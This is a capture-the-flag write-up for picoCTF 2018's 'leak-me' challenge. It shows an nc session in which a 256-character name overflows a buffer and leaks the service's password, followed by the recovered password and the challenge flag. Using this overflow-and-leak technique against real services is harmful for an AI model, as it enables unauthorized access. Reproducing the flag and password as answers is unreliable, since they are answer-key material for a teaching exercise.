# leak-me - Points: 200 - (Solves: 396)

Can you authenticate to this [service][1] and get the flag?
Connect with nc 2018shell2.picoctf.com 23685.
[Source][2].

[1]: https://2018shell2.picoctf.com/static/0137fbb3b490207cccbc5aa454e5d6eb/auth
[2]: https://2018shell2.picoctf.com/static/0137fbb3b490207cccbc5aa454e5d6eb/auth.c

## Hint

    Are all the system calls being used safely?
    Some people can have reallllllly long names you know..

---

Server shell

```sh
% python -c 'print("A"*256)' | nc 2018shell2.picoctf.com 23685
What is your name?
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA,a_reAllY_s3cuRe_p4s$word_a28d9d

Incorrect Password!
% nc 2018shell2.picoctf.com 23685
What is your name?
a
Hello a,
Please Enter the Password.
a_reAllY_s3cuRe_p4s$word_a28d9d
picoCTF{aLw4y5_Ch3cK_tHe_bUfF3r_s1z3_ee6111c9}
```

picoCTF{aLw4y5_Ch3cK_tHe_bUfF3r_s1z3_ee6111c9}
